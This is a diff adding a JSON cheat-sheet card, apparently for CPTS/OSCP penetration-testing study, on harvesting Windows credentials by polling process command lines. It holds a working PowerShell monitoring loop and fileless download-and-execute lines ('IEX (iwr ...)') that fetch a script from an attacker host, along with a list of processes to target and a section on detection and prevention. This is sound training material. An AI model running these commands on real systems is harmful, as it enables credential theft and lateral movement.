@@ -1,0 +1,76 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "process-monitoring",
+    "credentials"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Interacting with Users",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Poll Win32_Process and diff to catch transient command lines (main card)",
+      "command": "IEX (iwr 'http://10.10.10.205/procmon.ps1')"
+    }
+  ],
+  "notes": "=== Process Command Line Monitoring — Detect Short-Lived Credential Exposure ===\nCapture command lines of short-lived processes that would be missed by static enumeration.\n\n=== WHY THIS WORKS ===\nScheduled tasks, deployment scripts, and automation frequently pass credentials as command-line arguments.\nStatic snapshots (tasklist) miss processes that complete in under 1 second.\nThe monitoring script takes two snapshots separated by 1 second and shows only NEW processes — catching transient commands.\n\n=== SCRIPT LOGIC ===\n$startProcesses = Get-WmiObject Win32_Process | Select-Object ProcessId,CommandLine,CreationDate\nStart-Sleep -Seconds 1\n$endProcesses = Get-WmiObject Win32_Process | Select-Object ProcessId,CommandLine,CreationDate\nCompare-Object -ReferenceObject $startProcesses -DifferenceObject $endProcesses -Property ProcessId | Where-Object {$_.SideIndicator -eq '=>'} | ForEach-Object { (Get-WmiObject Win32_Process -Filter \"ProcessId='$($_.ProcessId)'\").CommandLine }\n\n=== HOSTING AND EXECUTION (AVOID DISK WRITE) ===\nHost script on attacker machine and pull via IEX (fileless):\n  IEX (iwr http://ATTACKER_IP/procmon.ps1 -UseBasicParsing)\n\nOr run in loop for extended monitoring:\n  while($true) { <monitoring script logic>; Start-Sleep 1 }\n\n=== TARGET PROCESSES ===\nnet use → domain credentials for mapped drives\nrunas → alternate user credentials  \npsexec → admin credentials for remote execution\nbackup tools → service account credentials passed on command line\ndatabase clients → connection strings with embedded passwords\nPowerShell scripts run as scheduled tasks → parameters may include credentials\n\n=== CHAINING CONTEXT ===\nProcess monitoring → scheduled task running backup with inline credentials → service account password\nProcess monitoring → automation script passing DB credentials → database pivot\nProcess monitoring → IT admin's manual commands → credentials for lateral movement targets\nCombine with clipboard monitoring for comprehensive passive capture\n\n=== WHAT TO LOOK FOR ===\nScheduled tasks that run on short intervals (every minute, every 5 minutes)\nIT departments running scripts with credentials passed as arguments (common in less mature environments)\nBackup jobs, sync scripts, monitoring agents — all commonly use credential parameters\nRun during business hours when automated tasks are most active",
+  "references": [
+    {
+      "title": "net-creds / procmon technique",
+      "url": "https://github.com/DanMcInerney/net-creds"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cred-hunting-findstr",
+      "note": "Chase down any creds/paths the monitor reveals.",
+      "rel": "next"
+    }
+  ],
+  "id": "process-cmdline-monitor",
+  "name": "Interacting with Users - Monitor Process Command Lines",
+  "command": "while($true){ $a=Get-WmiObject Win32_Process|select CommandLine; sleep 1; $b=Get-WmiObject Win32_Process|select CommandLine; Compare-Object $a $b }",
+  "description": "Poll running process command lines to catch scheduled tasks or scripts that pass credentials as arguments, or run a helper like procmon.ps1 that captures cleartext command lines over time.",
+  "opsec": "loud",
+  "mitre": [
+    "T1057"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Windows process command line arguments are accessible via WMI (Win32_Process.CommandLine). A polling script that captures and diffs process lists detects newly spawned processes and their full command lines, revealing credentials passed as arguments to newly launched processes (e.g., setup scripts, admin tools, backup jobs that run during a session).",
+    "prerequisites": "Shell access as any user. WMI access (standard user can query Win32_Process). Ability to run a long-lived PowerShell process.",
+    "impact": "Capture of credentials passed as command-line arguments to processes launched during the monitoring window — enabling privilege escalation or lateral movement if admin credentials appear in process command lines.",
+    "detection": "Long-running PowerShell process with Get-WmiObject Win32_Process polling. Compare-Object usage in a loop pattern. EDR: process polling behavior by standard user. Event ID 4688 with command-line logging: the monitoring script itself appears.",
+    "artifacts": "Process log: PowerShell WMI process monitoring loop | WMI query audit: frequent Win32_Process queries from single process",
+    "prevention": "Enable Process Creation Auditing with command-line logging (Event 4688) — this is the legitimate source that should be queried by defenders only. Never pass credentials as command-line arguments. Use DPAPI or Credential objects. Monitor for unusual long-lived WMI polling processes.",
+    "misconfiguration": "No restriction on WMI Win32_Process query access by standard users. Administrators running scripts with inline credential arguments during active user sessions.",
+    "vulnerable_config": "# Process monitoring captures credentials in command lines:\nwhile($true) {\n  $process = Get-WmiObject Win32_Process | Select-Object CommandLine\n  Start-Sleep 1\n  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine\n  Compare-Object -ReferenceObject $process -DifferenceObject $process2\n}\n# Captures: net use \\\\server /user:admin P@ss123! when admin runs it",
+    "secure_config": "# Never pass credentials as command-line arguments\n# Use PSCredential or Windows Credential Manager:\n$cred = Get-Credential\nNew-PSDrive -Name Z -PSProvider FileSystem -Root \\\\server -Credential $cred\n\n# Enable command-line logging for defenders only\n# Process Creation: Computer Conf > Audit Policy > Process Creation (Success)\n# Include command line in events: Computer Conf > Admin Templates > System > Audit Process Creation",
+    "sources": [
+      "HTB M26",
+      "MITRE T1057",
+      "MITRE T1552"
+    ]
+  }
+}
